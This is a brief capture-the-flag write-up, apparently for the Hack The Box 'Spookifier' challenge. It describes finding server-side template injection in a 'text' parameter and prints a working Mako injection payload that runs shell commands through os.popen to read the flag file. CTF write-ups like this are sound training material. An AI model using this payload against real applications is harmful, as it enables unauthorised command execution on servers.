# Spookifier

## Steps

1. Enter some test case via `text` parameter.
2. Notice our output displayed as the `text` parameter.
3.  Based from the ouput, it seems to be **SSTI**.
4.  I try some payloads about SSTI and see `${7*7}` active.

![Screenshot_2023-06-22_03-55-31](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/21c7d12b-9401-4f7c-8bd9-f10c38859a99)


5. After testing and checking source, we have some useful things.
  
![Screenshot_2023-06-22_03-37-47](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/46bf37b6-8a67-4345-b0c2-85ee90e78218)


6. We search `Mako template injection payload` and try some payload.
7. Final payload!!!

` ${self.__init__.__globals__['util'].os.popen('cd / && cat flag.txt').read()} `

![image](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/12674493-dfc5-4173-886c-e9fa40b920d4)


